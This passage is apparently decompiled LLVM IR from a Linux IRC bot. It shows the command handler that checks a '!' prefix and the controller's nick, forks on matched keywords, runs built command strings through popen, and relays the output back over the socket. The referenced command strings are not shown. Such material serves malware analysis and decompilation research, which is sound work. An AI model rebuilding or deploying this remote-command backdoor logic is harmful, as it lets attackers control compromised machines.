  br label %dec_label_pc_805485d

dec_label_pc_805485a:                             ; preds = %dec_label_pc_8054882
  %v4_805485a = add i32 %storemerge13, 1
  br label %dec_label_pc_805485d

dec_label_pc_805485d:                             ; preds = %dec_label_pc_805485d.preheader, %dec_label_pc_805485a
  %storemerge13 = phi i32 [ %v4_805485a, %dec_label_pc_805485a ], [ 0, %dec_label_pc_805485d.preheader ]
  store i32 %storemerge13, i32* %edx.global-to-local, align 4
  %v3_8054877 = call i32 @_strlen(i8* %tmp112)
  %v7_805487e = icmp ult i32 %storemerge13, %v3_8054877
  %v1_8054880 = icmp eq i1 %v7_805487e, false
  %.pre = add i32 %storemerge13, %arg3
  br i1 %v1_8054880, label %dec_label_pc_805485d.dec_label_pc_805488e_crit_edge, label %dec_label_pc_8054882

dec_label_pc_805485d.dec_label_pc_805488e_crit_edge: ; preds = %dec_label_pc_805485d
  %.pre90 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_805488e

dec_label_pc_8054882:                             ; preds = %dec_label_pc_805485d
  %v1_8054888 = inttoptr i32 %.pre to i8*
  %v2_8054888 = load i8, i8* %v1_8054888, align 1
  %v7_805488a = icmp eq i8 %v2_8054888, 32
  %v1_805488c = icmp eq i1 %v7_805488a, false
  br i1 %v1_805488c, label %dec_label_pc_805485a, label %dec_label_pc_805488e

dec_label_pc_805488e:                             ; preds = %dec_label_pc_8054882, %dec_label_pc_805485d.dec_label_pc_805488e_crit_edge
  %v1_8054894.pre-phi = phi i8* [ %.pre90, %dec_label_pc_805485d.dec_label_pc_805488e_crit_edge ], [ %v1_8054888, %dec_label_pc_8054882 ]
  store i8 0, i8* %v1_8054894.pre-phi, align 1
  %v1_80548a3 = add i32 %.pre, 2
  %v5_80548a6 = inttoptr i32 %v1_80548a3 to i8*
  store i8* %v5_80548a6, i8** %stack_var_-64, align 4
  br label %dec_label_pc_80548b5

dec_label_pc_80548b2:                             ; preds = %dec_label_pc_80548da
  %v4_80548b2 = add i32 %storemerge12, 1
  br label %dec_label_pc_80548b5

dec_label_pc_80548b5:                             ; preds = %dec_label_pc_805488e, %dec_label_pc_80548b2
  %storemerge12 = phi i32 [ %v4_80548b2, %dec_label_pc_80548b2 ], [ 0, %dec_label_pc_805488e ]
  store i32 %storemerge12, i32* %edx.global-to-local, align 4
  store i32 %v4_805483e, i32* @edi, align 4
  %v3_80548cf = call i32 @_strlen(i8* %arg2)
  %v7_80548d6 = icmp ult i32 %storemerge12, %v3_80548cf
  %v1_80548d8 = icmp eq i1 %v7_80548d6, false
  %.pre189 = add i32 %storemerge12, %v4_805483e
  br i1 %v1_80548d8, label %dec_label_pc_80548b5.dec_label_pc_80548e6_crit_edge, label %dec_label_pc_80548da

dec_label_pc_80548b5.dec_label_pc_80548e6_crit_edge: ; preds = %dec_label_pc_80548b5
  %.pre193 = inttoptr i32 %.pre189 to i8*
  br label %dec_label_pc_80548e6

dec_label_pc_80548da:                             ; preds = %dec_label_pc_80548b5
  %v1_80548e0 = inttoptr i32 %.pre189 to i8*
  %v2_80548e0 = load i8, i8* %v1_80548e0, align 1
  %v10_80548e2 = icmp eq i8 %v2_80548e0, 33
  %v1_80548e4 = icmp eq i1 %v10_80548e2, false
  br i1 %v1_80548e4, label %dec_label_pc_80548b2, label %dec_label_pc_80548e6

dec_label_pc_80548e6:                             ; preds = %dec_label_pc_80548b5.dec_label_pc_80548e6_crit_edge, %dec_label_pc_80548da
  %v1_80548ec.pre-phi = phi i8* [ %.pre193, %dec_label_pc_80548b5.dec_label_pc_80548e6_crit_edge ], [ %v1_80548e0, %dec_label_pc_80548da ]
  store i8 0, i8* %v1_80548ec.pre-phi, align 1
  %v3_80548ef = load i8*, i8** %stack_var_-64, align 4
  %v4_80548ef = ptrtoint i8* %v3_80548ef to i32
  %v2_80548f2 = load i8, i8* %v3_80548ef, align 1
  %v3_80548f2 = zext i8 %v2_80548f2 to i32
  %v5_80548f2 = and i32 %v4_80548ef, -256
  %v6_80548f2 = or i32 %v3_80548f2, %v5_80548f2
  %v10_80548f4 = icmp eq i8 %v2_80548f2, 33
  %v1_80548f6 = icmp eq i1 %v10_80548f4, false
  br i1 %v1_80548f6, label %dec_label_pc_805564f, label %dec_label_pc_80548fc

dec_label_pc_80548fc:                             ; preds = %dec_label_pc_80548e6
  %v0_80548fc = load i32, i32* @global_var_807e56c.330, align 4
  %v4_8054908 = call i32 @__GI_strcasecmp(i8* %tmp112, i32 %v0_80548fc)
  %v1_8054910 = icmp eq i32 %v4_8054908, 0
  %v1_8054912 = icmp eq i1 %v1_8054910, false
  br i1 %v1_8054912, label %dec_label_pc_805564f, label %dec_label_pc_8054918

dec_label_pc_8054918:                             ; preds = %dec_label_pc_80548fc
  %v2_8054918 = ptrtoint i32* %stack_var_-1144 to i32
  store i32 %v2_8054918, i32* %edx.global-to-local, align 4
  %v4_805492a = bitcast i32* %stack_var_-1144 to i8*
  %v5_805492a = call i32 @__GI_memset(i8* %v4_805492a, i32 0, i32 1024)
  %v3_8054939 = load i8*, i8** %stack_var_-64, align 4
  %v4_8054939 = ptrtoint i8* %v3_8054939 to i32
  %v5_8054939 = add i32 %v4_8054939, 1
  %v22_8054939 = inttoptr i32 %v5_8054939 to i8*
  store i8* %v22_8054939, i8** %stack_var_-64, align 4
  br label %dec_label_pc_8054948

dec_label_pc_8054945:                             ; preds = %dec_label_pc_805496d
  %v4_8054945 = add i32 %storemerge11, 1
  br label %dec_label_pc_8054948

dec_label_pc_8054948:                             ; preds = %dec_label_pc_8054918, %dec_label_pc_8054945
  %v3_805494b = phi i8* [ %v4_805497c.pre, %dec_label_pc_8054945 ], [ %v22_8054939, %dec_label_pc_8054918 ]
  %storemerge11 = phi i32 [ %v4_8054945, %dec_label_pc_8054945 ], [ 0, %dec_label_pc_8054918 ]
  store i32 %storemerge11, i32* %edx.global-to-local, align 4
  %v4_805494b = ptrtoint i8* %v3_805494b to i32
  store i1 false, i1* @df, align 1
  store i32 %v4_805494b, i32* @edi, align 4
  %v3_8054962 = call i32 @_strlen(i8* %v3_805494b)
  %v7_8054969 = icmp ult i32 %storemerge11, %v3_8054962
  %v1_805496b = icmp eq i1 %v7_8054969, false
  %v4_805497c.pre = load i8*, i8** %stack_var_-64, align 4
  %.pre194 = ptrtoint i8* %v4_805497c.pre to i32
  %.pre195 = add i32 %.pre194, %storemerge11
  br i1 %v1_805496b, label %dec_label_pc_8054948.dec_label_pc_8054979_crit_edge, label %dec_label_pc_805496d

dec_label_pc_8054948.dec_label_pc_8054979_crit_edge: ; preds = %dec_label_pc_8054948
  %.pre196 = inttoptr i32 %.pre195 to i8*
  br label %dec_label_pc_8054979

dec_label_pc_805496d:                             ; preds = %dec_label_pc_8054948
  %v1_8054973 = inttoptr i32 %.pre195 to i8*
  %v2_8054973 = load i8, i8* %v1_8054973, align 1
  %v7_8054975 = icmp eq i8 %v2_8054973, 32
  %v1_8054977 = icmp eq i1 %v7_8054975, false
  br i1 %v1_8054977, label %dec_label_pc_8054945, label %dec_label_pc_8054979

dec_label_pc_8054979:                             ; preds = %dec_label_pc_8054948.dec_label_pc_8054979_crit_edge, %dec_label_pc_805496d
  %v1_805497f.pre-phi = phi i8* [ %.pre196, %dec_label_pc_8054948.dec_label_pc_8054979_crit_edge ], [ %v1_8054973, %dec_label_pc_805496d ]
  store i8 0, i8* %v1_805497f.pre-phi, align 1
  %v0_8054982 = load i32, i32* @global_var_807d3cc.53, align 4
  %v3_805498b = load i8*, i8** %stack_var_-64, align 4
  %v4_805498e = call i32 @strwildmatch(i8* %v3_805498b, i32 %v0_8054982)
  %v1_8054996 = icmp eq i32 %v4_805498e, 0
  %v1_8054998 = icmp eq i1 %v1_8054996, false
  br i1 %v1_8054998, label %dec_label_pc_805564f, label %dec_label_pc_805499e

dec_label_pc_805499e:                             ; preds = %dec_label_pc_8054979
  %v4_80549a1 = load i8*, i8** %stack_var_-64, align 4
  %v5_80549a1 = ptrtoint i8* %v4_80549a1 to i32
  %v6_80549a1 = add i32 %storemerge11, 1
  %v1_80549a4 = add i32 %v6_80549a1, %v5_80549a1
  store i32 %v1_80549a4, i32* @eax, align 4
  %v5_80549a5 = inttoptr i32 %v1_80549a4 to i8*
  store i8* %v5_80549a5, i8** %stack_var_-64, align 4
  %v5_80549b5 = call i32 @__GI_strncmp(i8* %v5_80549a5, i32 ptrtoint ([5 x i8]* @global_var_806bb50.563 to i32), i32 4)
  store i32 %v5_80549b5, i32* @eax, align 4
  %v1_80549bd = icmp eq i32 %v5_80549b5, 0
  %v1_80549bf = icmp eq i1 %v1_80549bd, false
  br i1 %v1_80549bf, label %dec_label_pc_80549fc, label %dec_label_pc_80549c1

dec_label_pc_80549c1:                             ; preds = %dec_label_pc_805499e
  %v0_80549c1 = load i8, i8* @global_var_80748e8.28, align 8
  %v4_80549c6 = icmp eq i8 %v0_80549c1, 0
  br i1 %v4_80549c6, label %dec_label_pc_80549e2, label %dec_label_pc_80549ca

dec_label_pc_80549ca:                             ; preds = %dec_label_pc_80549c1
  %v3_80549d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_806884c.30 to i32))
  store i32 %v3_80549d8, i32* @eax, align 4
  br label %dec_label_pc_80549fc

dec_label_pc_80549e2:                             ; preds = %dec_label_pc_80549c1
  %v3_80549f4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([4 x i8]* @global_var_806bb55.564 to i32))
  store i32 %v3_80549f4, i32* @eax, align 4
  br label %dec_label_pc_80549fc

dec_label_pc_80549fc:                             ; preds = %dec_label_pc_805499e, %dec_label_pc_80549ca, %dec_label_pc_80549e2
  %v3_8054a06 = load i8*, i8** %stack_var_-64, align 4
  %v5_8054a09 = call i32 @__GI_strncmp(i8* %v3_8054a06, i32 ptrtoint ([4 x i8]* @global_var_806bb59.565 to i32), i32 3)
  store i32 %v5_8054a09, i32* @eax, align 4
  %v1_8054a11 = icmp eq i32 %v5_8054a09, 0
  %v1_8054a13 = icmp eq i1 %v1_8054a11, false
  br i1 %v1_8054a13, label %dec_label_pc_8054b06, label %dec_label_pc_8054a19

dec_label_pc_8054a19:                             ; preds = %dec_label_pc_80549fc
  %v1_8054a1f = call i32 @mfork(i32 %v4_805483e)
  %v1_8054a27 = icmp eq i32 %v1_8054a1f, 0
  %v1_8054a29 = icmp eq i1 %v1_8054a27, false
  br i1 %v1_8054a29, label %dec_label_pc_805564f, label %dec_label_pc_8054a2f

dec_label_pc_8054a2f:                             ; preds = %dec_label_pc_8054a19
  %v2_8054a39 = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8054a40 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8054a40 = call i32 @__GI_memset(i8* %v4_8054a40, i32 0, i32 1024)
  %v3_8054a5e = call i32 @sprintf(i32 %v2_8054a39, i32 ptrtoint ([69 x i8]* @global_var_806bb60.566 to i32))
  store i32 %v2_8054a39, i32* @eax, align 4
  %v4_8054a75 = call i32 @popen(i32 %v2_8054a39, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8068ea3.83, i32 0, i32 0))
  %v1_8054ae2 = inttoptr i32 %v4_8054a75 to i32*
  %v2_8054ae2182 = call i32 @feof(i32* %v1_8054ae2)
  %v1_8054aea183 = icmp eq i32 %v2_8054ae2182, 0
  br i1 %v1_8054aea183, label %dec_label_pc_8054a82, label %dec_label_pc_8054aee

dec_label_pc_8054a82:                             ; preds = %dec_label_pc_8054a2f, %dec_label_pc_8054a82
  %v5_8054a93 = call i32 @__GI_memset(i8* %v4_8054a40, i32 0, i32 1024)
  %v4_8054aad = call i32 @fgets(i32 %v2_8054a39, i32 1024, i32 %v4_8054a75)
  %v3_8054ac7 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bba5.567 to i32))
  %v1_8054ad4 = call i32 @sleep(i32 1)
  %v2_8054ae2 = call i32 @feof(i32* %v1_8054ae2)
  %v1_8054aea = icmp eq i32 %v2_8054ae2, 0
  br i1 %v1_8054aea, label %dec_label_pc_8054a82, label %dec_label_pc_8054aee

dec_label_pc_8054aee:                             ; preds = %dec_label_pc_8054a82, %dec_label_pc_8054a2f
  %v1_8054af4 = call i32 @pclose(i32 %v4_8054a75)
  %v1_8054b01 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8054b01, i32* @eax, align 4
  br label %dec_label_pc_8054b06

dec_label_pc_8054b06:                             ; preds = %dec_label_pc_80549fc, %dec_label_pc_8054aee
  %v3_8054b10 = load i8*, i8** %stack_var_-64, align 4
  %v5_8054b13 = call i32 @__GI_strncmp(i8* %v3_8054b10, i32 ptrtoint ([5 x i8]* @global_var_806bbb4.568 to i32), i32 4)
  store i32 %v5_8054b13, i32* @eax, align 4
  %v1_8054b1b = icmp eq i32 %v5_8054b13, 0
  %v1_8054b1d = icmp eq i1 %v1_8054b1b, false
  br i1 %v1_8054b1d, label %dec_label_pc_8054c10, label %dec_label_pc_8054b23

dec_label_pc_8054b23:                             ; preds = %dec_label_pc_8054b06
  %v1_8054b29 = call i32 @mfork(i32 %v4_805483e)
  %v1_8054b31 = icmp eq i32 %v1_8054b29, 0
  %v1_8054b33 = icmp eq i1 %v1_8054b31, false
  br i1 %v1_8054b33, label %dec_label_pc_805564f, label %dec_label_pc_8054b39

dec_label_pc_8054b39:                             ; preds = %dec_label_pc_8054b23
  %v2_8054b43 = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8054b4a = bitcast i32* %stack_var_-2168 to i8*
  %v5_8054b4a = call i32 @__GI_memset(i8* %v4_8054b4a, i32 0, i32 1024)
  %v3_8054b68 = call i32 @sprintf(i32 %v2_8054b43, i32 ptrtoint ([100 x i8]* @global_var_806bbbc.569 to i32))
  store i32 %v2_8054b43, i32* @eax, align 4
  %v4_8054b7f = call i32 @popen(i32 %v2_8054b43, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8068ea3.83, i32 0, i32 0))
  %v1_8054bec = inttoptr i32 %v4_8054b7f to i32*
  %v2_8054bec180 = call i32 @feof(i32* %v1_8054bec)
  %v1_8054bf4181 = icmp eq i32 %v2_8054bec180, 0
  br i1 %v1_8054bf4181, label %dec_label_pc_8054b8c, label %dec_label_pc_8054bf8

dec_label_pc_8054b8c:                             ; preds = %dec_label_pc_8054b39, %dec_label_pc_8054b8c
  %v5_8054b9d = call i32 @__GI_memset(i8* %v4_8054b4a, i32 0, i32 1024)
  %v4_8054bb7 = call i32 @fgets(i32 %v2_8054b43, i32 1024, i32 %v4_8054b7f)
  %v3_8054bd1 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bba5.567 to i32))
  %v1_8054bde = call i32 @sleep(i32 1)
  %v2_8054bec = call i32 @feof(i32* %v1_8054bec)
  %v1_8054bf4 = icmp eq i32 %v2_8054bec, 0
  br i1 %v1_8054bf4, label %dec_label_pc_8054b8c, label %dec_label_pc_8054bf8

dec_label_pc_8054bf8:                             ; preds = %dec_label_pc_8054b8c, %dec_label_pc_8054b39
  %v1_8054bfe = call i32 @pclose(i32 %v4_8054b7f)
  %v1_8054c0b = call i32 @__GI_exit(i32 0)
  store i32 %v1_8054c0b, i32* @eax, align 4
  br label %dec_label_pc_8054c10

dec_label_pc_8054c10:                             ; preds = %dec_label_pc_8054b06, %dec_label_pc_8054bf8
  %v3_8054c1a = load i8*, i8** %stack_var_-64, align 4
  %v5_8054c1d = call i32 @__GI_strncmp(i8* %v3_8054c1a, i32 ptrtoint ([7 x i8]* @global_var_806bc20.570 to i32), i32 6)
  store i32 %v5_8054c1d, i32* @eax, align 4
  %v1_8054c25 = icmp eq i32 %v5_8054c1d, 0
  %v1_8054c27 = icmp eq i1 %v1_8054c25, false
  br i1 %v1_8054c27, label %dec_label_pc_8054d1a, label %dec_label_pc_8054c2d

dec_label_pc_8054c2d:                             ; preds = %dec_label_pc_8054c10
  %v1_8054c33 = call i32 @mfork(i32 %v4_805483e)
  %v1_8054c3b = icmp eq i32 %v1_8054c33, 0
  %v1_8054c3d = icmp eq i1 %v1_8054c3b, false
  br i1 %v1_8054c3d, label %dec_label_pc_805564f, label %dec_label_pc_8054c43

dec_label_pc_8054c43:                             ; preds = %dec_label_pc_8054c2d
  %v2_8054c4d = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8054c54 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8054c54 = call i32 @__GI_memset(i8* %v4_8054c54, i32 0, i32 1024)
  %v3_8054c72 = call i32 @sprintf(i32 %v2_8054c4d, i32 ptrtoint ([330 x i8]* @global_var_806bc28.571 to i32))
  store i32 %v2_8054c4d, i32* @eax, align 4
  %v4_8054c89 = call i32 @popen(i32 %v2_8054c4d, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8068ea3.83, i32 0, i32 0))
  %v1_8054cf6 = inttoptr i32 %v4_8054c89 to i32*
  %v2_8054cf6178 = call i32 @feof(i32* %v1_8054cf6)
  %v1_8054cfe179 = icmp eq i32 %v2_8054cf6178, 0
  br i1 %v1_8054cfe179, label %dec_label_pc_8054c96, label %dec_label_pc_8054d02

dec_label_pc_8054c96:                             ; preds = %dec_label_pc_8054c43, %dec_label_pc_8054c96
  %v5_8054ca7 = call i32 @__GI_memset(i8* %v4_8054c54, i32 0, i32 1024)
  %v4_8054cc1 = call i32 @fgets(i32 %v2_8054c4d, i32 1024, i32 %v4_8054c89)
  %v3_8054cdb = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bba5.567 to i32))
  %v1_8054ce8 = call i32 @sleep(i32 1)
  %v2_8054cf6 = call i32 @feof(i32* %v1_8054cf6)
  %v1_8054cfe = icmp eq i32 %v2_8054cf6, 0
  br i1 %v1_8054cfe, label %dec_label_pc_8054c96, label %dec_label_pc_8054d02

dec_label_pc_8054d02:                             ; preds = %dec_label_pc_8054c96, %dec_label_pc_8054c43
  %v1_8054d08 = call i32 @pclose(i32 %v4_8054c89)
  %v1_8054d15 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8054d15, i32* @eax, align 4
  br label %dec_label_pc_8054d1a

dec_label_pc_8054d1a:                             ; preds = %dec_label_pc_8054c10, %dec_label_pc_8054d02
  %v3_8054d24 = load i8*, i8** %stack_var_-64, align 4
  %v5_8054d27 = call i32 @__GI_strncmp(i8* %v3_8054d24, i32 ptrtoint ([8 x i8]* @global_var_806bd72.572 to i32), i32 7)
  store i32 %v5_8054d27, i32* @eax, align 4
  %v1_8054d2f = icmp eq i32 %v5_8054d27, 0
  %v1_8054d31 = icmp eq i1 %v1_8054d2f, false
  br i1 %v1_8054d31, label %dec_label_pc_8054e24, label %dec_label_pc_8054d37

dec_label_pc_8054d37:                             ; preds = %dec_label_pc_8054d1a
  %v1_8054d3d = call i32 @mfork(i32 %v4_805483e)
  %v1_8054d45 = icmp eq i32 %v1_8054d3d, 0
  %v1_8054d47 = icmp eq i1 %v1_8054d45, false
  br i1 %v1_8054d47, label %dec_label_pc_805564f, label %dec_label_pc_8054d4d

dec_label_pc_8054d4d:                             ; preds = %dec_label_pc_8054d37
  %v2_8054d57 = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8054d5e = bitcast i32* %stack_var_-2168 to i8*
  %v5_8054d5e = call i32 @__GI_memset(i8* %v4_8054d5e, i32 0, i32 1024)
  %v3_8054d7c = call i32 @sprintf(i32 %v2_8054d57, i32 ptrtoint ([668 x i8]* @global_var_806bd7c.573 to i32))
  store i32 %v2_8054d57, i32* @eax, align 4
  %v4_8054d93 = call i32 @popen(i32 %v2_8054d57, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8068ea3.83, i32 0, i32 0))
  %v1_8054e00 = inttoptr i32 %v4_8054d93 to i32*
  %v2_8054e00176 = call i32 @feof(i32* %v1_8054e00)
  %v1_8054e08177 = icmp eq i32 %v2_8054e00176, 0
  br i1 %v1_8054e08177, label %dec_label_pc_8054da0, label %dec_label_pc_8054e0c

dec_label_pc_8054da0:                             ; preds = %dec_label_pc_8054d4d, %dec_label_pc_8054da0
  %v5_8054db1 = call i32 @__GI_memset(i8* %v4_8054d5e, i32 0, i32 1024)
  %v4_8054dcb = call i32 @fgets(i32 %v2_8054d57, i32 1024, i32 %v4_8054d93)
  %v3_8054de5 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bba5.567 to i32))
  %v1_8054df2 = call i32 @sleep(i32 1)
  %v2_8054e00 = call i32 @feof(i32* %v1_8054e00)
  %v1_8054e08 = icmp eq i32 %v2_8054e00, 0
  br i1 %v1_8054e08, label %dec_label_pc_8054da0, label %dec_label_pc_8054e0c

dec_label_pc_8054e0c:                             ; preds = %dec_label_pc_8054da0, %dec_label_pc_8054d4d
  %v1_8054e12 = call i32 @pclose(i32 %v4_8054d93)
  %v1_8054e1f = call i32 @__GI_exit(i32 0)
  store i32 %v1_8054e1f, i32* @eax, align 4
  br label %dec_label_pc_8054e24

dec_label_pc_8054e24:                             ; preds = %dec_label_pc_8054d1a, %dec_label_pc_8054e0c
  %v3_8054e2e = load i8*, i8** %stack_var_-64, align 4
  %v5_8054e31 = call i32 @__GI_strncmp(i8* %v3_8054e2e, i32 ptrtoint ([9 x i8]* @global_var_806c018.574 to i32), i32 8)
  store i32 %v5_8054e31, i32* @eax, align 4
  %v1_8054e39 = icmp eq i32 %v5_8054e31, 0
  %v1_8054e3b = icmp eq i1 %v1_8054e39, false
  br i1 %v1_8054e3b, label %dec_label_pc_8054f2e, label %dec_label_pc_8054e41

dec_label_pc_8054e41:                             ; preds = %dec_label_pc_8054e24
  %v1_8054e47 = call i32 @mfork(i32 %v4_805483e)
  %v1_8054e4f = icmp eq i32 %v1_8054e47, 0
  %v1_8054e51 = icmp eq i1 %v1_8054e4f, false
  br i1 %v1_8054e51, label %dec_label_pc_805564f, label %dec_label_pc_8054e57

dec_label_pc_8054e57:                             ; preds = %dec_label_pc_8054e41
  %v2_8054e61 = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8054e68 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8054e68 = call i32 @__GI_memset(i8* %v4_8054e68, i32 0, i32 1024)
  %v3_8054e86 = call i32 @sprintf(i32 %v2_8054e61, i32 ptrtoint ([389 x i8]* @global_var_806c024.575 to i32))
  store i32 %v2_8054e61, i32* @eax, align 4
  %v4_8054e9d = call i32 @popen(i32 %v2_8054e61, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8068ea3.83, i32 0, i32 0))
  %v1_8054f0a = inttoptr i32 %v4_8054e9d to i32*
  %v2_8054f0a174 = call i32 @feof(i32* %v1_8054f0a)
  %v1_8054f12175 = icmp eq i32 %v2_8054f0a174, 0
  br i1 %v1_8054f12175, label %dec_label_pc_8054eaa, label %dec_label_pc_8054f16

dec_label_pc_8054eaa:                             ; preds = %dec_label_pc_8054e57, %dec_label_pc_8054eaa
  %v5_8054ebb = call i32 @__GI_memset(i8* %v4_8054e68, i32 0, i32 1024)
  %v4_8054ed5 = call i32 @fgets(i32 %v2_8054e61, i32 1024, i32 %v4_8054e9d)
  %v3_8054eef = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bba5.567 to i32))
  %v1_8054efc = call i32 @sleep(i32 1)
  %v2_8054f0a = call i32 @feof(i32* %v1_8054f0a)
  %v1_8054f12 = icmp eq i32 %v2_8054f0a, 0
  br i1 %v1_8054f12, label %dec_label_pc_8054eaa, label %dec_label_pc_8054f16

dec_label_pc_8054f16:                             ; preds = %dec_label_pc_8054eaa, %dec_label_pc_8054e57
  %v1_8054f1c = call i32 @pclose(i32 %v4_8054e9d)
  %v1_8054f29 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8054f29, i32* @eax, align 4
  br label %dec_label_pc_8054f2e

dec_label_pc_8054f2e:                             ; preds = %dec_label_pc_8054e24, %dec_label_pc_8054f16
  %v3_8054f38 = load i8*, i8** %stack_var_-64, align 4
  %v5_8054f3b = call i32 @__GI_strncmp(i8* %v3_8054f38, i32 ptrtoint ([11 x i8]* @global_var_806c1a9.576 to i32), i32 10)
  store i32 %v5_8054f3b, i32* @eax, align 4
  %v1_8054f43 = icmp eq i32 %v5_8054f3b, 0
  %v1_8054f45 = icmp eq i1 %v1_8054f43, false
  br i1 %v1_8054f45, label %dec_label_pc_8055038, label %dec_label_pc_8054f4b

dec_label_pc_8054f4b:                             ; preds = %dec_label_pc_8054f2e
  %v1_8054f51 = call i32 @mfork(i32 %v4_805483e)
  %v1_8054f59 = icmp eq i32 %v1_8054f51, 0
  %v1_8054f5b = icmp eq i1 %v1_8054f59, false
  br i1 %v1_8054f5b, label %dec_label_pc_805564f, label %dec_label_pc_8054f61

dec_label_pc_8054f61:                             ; preds = %dec_label_pc_8054f4b
  %v2_8054f6b = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8054f72 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8054f72 = call i32 @__GI_memset(i8* %v4_8054f72, i32 0, i32 1024)
  %v3_8054f90 = call i32 @sprintf(i32 %v2_8054f6b, i32 ptrtoint ([371 x i8]* @global_var_806c1b4.577 to i32))
  store i32 %v2_8054f6b, i32* @eax, align 4
  %v4_8054fa7 = call i32 @popen(i32 %v2_8054f6b, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8068ea3.83, i32 0, i32 0))
  %v1_8055014 = inttoptr i32 %v4_8054fa7 to i32*
  %v2_8055014172 = call i32 @feof(i32* %v1_8055014)
  %v1_805501c173 = icmp eq i32 %v2_8055014172, 0
  br i1 %v1_805501c173, label %dec_label_pc_8054fb4, label %dec_label_pc_8055020

dec_label_pc_8054fb4:                             ; preds = %dec_label_pc_8054f61, %dec_label_pc_8054fb4
  %v5_8054fc5 = call i32 @__GI_memset(i8* %v4_8054f72, i32 0, i32 1024)
  %v4_8054fdf = call i32 @fgets(i32 %v2_8054f6b, i32 1024, i32 %v4_8054fa7)
  %v3_8054ff9 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bba5.567 to i32))
  %v1_8055006 = call i32 @sleep(i32 1)
  %v2_8055014 = call i32 @feof(i32* %v1_8055014)
  %v1_805501c = icmp eq i32 %v2_8055014, 0
  br i1 %v1_805501c, label %dec_label_pc_8054fb4, label %dec_label_pc_8055020

dec_label_pc_8055020:                             ; preds = %dec_label_pc_8054fb4, %dec_label_pc_8054f61
  %v1_8055026 = call i32 @pclose(i32 %v4_8054fa7)
  %v1_8055033 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8055033, i32* @eax, align 4
  br label %dec_label_pc_8055038

dec_label_pc_8055038:                             ; preds = %dec_label_pc_8054f2e, %dec_label_pc_8055020
  %v3_8055042 = load i8*, i8** %stack_var_-64, align 4
  %v5_8055045 = call i32 @__GI_strncmp(i8* %v3_8055042, i32 ptrtoint ([8 x i8]* @global_var_806c327.578 to i32), i32 7)
  store i32 %v5_8055045, i32* @eax, align 4
  %v1_805504d = icmp eq i32 %v5_8055045, 0
  %v1_805504f = icmp eq i1 %v1_805504d, false
  br i1 %v1_805504f, label %dec_label_pc_8055142, label %dec_label_pc_8055055

dec_label_pc_8055055:                             ; preds = %dec_label_pc_8055038
  %v1_805505b = call i32 @mfork(i32 %v4_805483e)
  %v1_8055063 = icmp eq i32 %v1_805505b, 0
  %v1_8055065 = icmp eq i1 %v1_8055063, false
  br i1 %v1_8055065, label %dec_label_pc_805564f, label %dec_label_pc_805506b

dec_label_pc_805506b:                             ; preds = %dec_label_pc_8055055
  %v2_8055075 = ptrtoint i32* %stack_var_-2168 to i32
  %v4_805507c = bitcast i32* %stack_var_-2168 to i8*
  %v5_805507c = call i32 @__GI_memset(i8* %v4_805507c, i32 0, i32 1024)
  %v3_805509a = call i32 @sprintf(i32 %v2_8055075, i32 ptrtoint ([235 x i8]* @global_var_806c330.579 to i32))
  store i32 %v2_8055075, i32* @eax, align 4
  %v4_80550b1 = call i32 @popen(i32 %v2_8055075, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8068ea3.83, i32 0, i32 0))
  %v1_805511e = inttoptr i32 %v4_80550b1 to i32*
  %v2_805511e170 = call i32 @feof(i32* %v1_805511e)
  %v1_8055126171 = icmp eq i32 %v2_805511e170, 0
  br i1 %v1_8055126171, label %dec_label_pc_80550be, label %dec_label_pc_805512a

dec_label_pc_80550be:                             ; preds = %dec_label_pc_805506b, %dec_label_pc_80550be
  %v5_80550cf = call i32 @__GI_memset(i8* %v4_805507c, i32 0, i32 1024)
  %v4_80550e9 = call i32 @fgets(i32 %v2_8055075, i32 1024, i32 %v4_80550b1)
  %v3_8055103 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bba5.567 to i32))
  %v1_8055110 = call i32 @sleep(i32 1)
  %v2_805511e = call i32 @feof(i32* %v1_805511e)
  %v1_8055126 = icmp eq i32 %v2_805511e, 0
  br i1 %v1_8055126, label %dec_label_pc_80550be, label %dec_label_pc_805512a

dec_label_pc_805512a:                             ; preds = %dec_label_pc_80550be, %dec_label_pc_805506b
  %v1_8055130 = call i32 @pclose(i32 %v4_80550b1)
  %v1_805513d = call i32 @__GI_exit(i32 0)
  store i32 %v1_805513d, i32* @eax, align 4
  br label %dec_label_pc_8055142

dec_label_pc_8055142:                             ; preds = %dec_label_pc_8055038, %dec_label_pc_805512a
  %v3_805514c = load i8*, i8** %stack_var_-64, align 4
  %v5_805514f = call i32 @__GI_strncmp(i8* %v3_805514c, i32 ptrtoint ([8 x i8]* @global_var_806c41b.580 to i32), i32 6)
  store i32 %v5_805514f, i32* @eax, align 4
  %v1_8055157 = icmp eq i32 %v5_805514f, 0
  %v1_8055159 = icmp eq i1 %v1_8055157, false
